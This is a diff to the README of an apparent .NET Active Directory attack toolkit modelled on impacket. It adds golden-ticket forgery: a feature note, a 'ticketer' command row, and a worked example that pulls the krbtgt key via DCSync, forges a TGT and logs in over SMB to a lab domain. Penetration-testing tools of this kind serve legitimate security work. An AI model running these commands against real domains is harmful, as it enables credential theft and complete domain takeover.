@@ -10,7 +10,7 @@ SMB2/3 · DCERPC (MSRPC) · LDAP · Kerberos · NTLM/SPNEGO · TDS · DCSync · 
 
 [![.NET](https://img.shields.io/badge/.NET-8.0-512BD4?logo=dotnet&logoColor=white)](https://dotnet.microsoft.com/)
 [![CI](https://github.com/SieBRUM/dotnetpacket/actions/workflows/ci.yml/badge.svg)](../../actions/workflows/ci.yml)
-[![Tests](https://img.shields.io/badge/tests-303%20passing-success)](tests/)
+[![Tests](https://img.shields.io/badge/tests-306%20passing-success)](tests/)
 [![Release](https://img.shields.io/github/v/release/SieBRUM/dotnetpacket?include_prereleases&sort=semver)](../../releases)
 
 </div>
@@ -52,8 +52,9 @@ A realistic, **signed**, modern-Windows-style stack, validated end-to-end agains
 - **Kerberos v5** — AS-REQ/AS-REP (with and without pre-auth), TGS-REQ/TGS-REP, **RC4-HMAC and
   AES128/256-CTS-HMAC-SHA1-96** (RFC 3962, byte-exact vs impacket + RFC vectors), AP-REQ/AP-REP SMB
   login (`-k`, AES-256 by default), **sealed GSS-SPNEGO LDAP binds**, **S4U2self/S4U2proxy**
-  constrained delegation, AS-REP-roast / Kerberoast hash output, MIT **ccache** read/write, and a
-  **PAC** parser + signature verifier.
+  constrained delegation, AS-REP-roast / Kerberoast hash output, MIT **ccache** read/write, a
+  **PAC** parser + signature verifier, and **golden-ticket forgery** (`ticketer` — builds + signs a PAC
+  and mints a TGT from the krbtgt key).
 - **NTLM / SPNEGO**, **TDS** (MS-TDS pre-login), **GPP** cpassword, **LAPS**, and an **ntlmrelayx**
   relay server (SMB→SMB, HTTP→SMB, SMB→LDAP).
 
@@ -191,6 +192,15 @@ dotnetpacket dcsync 'lab.local/Administrator@127.0.0.1' krbtgt -hashes :ac8d0d3c
 dotnetpacket dcsync-all-k 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' vm.lab.local -k
 ```
 
+**Golden ticket (forge a TGT from the krbtgt key)**
+
+```bash
+# 1) get the krbtgt key + domain SID (DCSync), 2) forge, 3) use the ticket with -k
+dotnetpacket dcsync 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' krbtgt        # -> krbtgt aes256 key
+dotnetpacket ticketer lab.local LAB S-1-5-21-... Administrator <krbtgt-aes256-hex> -save-ccache golden.ccache
+KRB5CCNAME=golden.ccache dotnetpacket smb2-login 'lab.local/Administrator@dc01.lab.local' -k
+```
+
 **Edit an object's DACL, then read it back**
 
 ```bash
@@ -274,6 +284,7 @@ dotnetpacket rpc-samrdump 'LAB/Administrator:LabAdm1n!Pass@dc01.lab.local' -prox
 | `get-userspns` | `<target> [target-user] [port]` | `GetUserSPNs.py` | Kerberoast SPN accounts |
 | `get-st` | `<domain-fqdn/service-user[:password]@dc-host> <impersonate> <target-spn> [port]` | `getST.py` | S4U2self + S4U2proxy — a constrained-delegation ticket impersonating a user |
 | `getpac` | `<dc-host> <service-user> <domain-fqdn> <impersonate> <service-key-hex> [krbtgt-key-hex] [port]` | `getPac.py` | S4U2self, decrypt the ticket, parse the **PAC** (RID, groups, ExtraSids) and verify its SERVER/KDC signatures |
+| `ticketer` | `<domain-fqdn> <netbios> <domain-sid> <username> <krbtgt-key-hex> [user-rid=500]` | `ticketer.py` | **golden ticket** — forge a TGT (+ signed PAC with PAC_REQUESTOR/ATTRIBUTES) from the krbtgt key into a ccache |
 | `rpc-changepw` | `<target> <newpass> [port]` | `changepasswd.py` | change a password (SAMR) |
 
 ### Credential dumping — DCSync
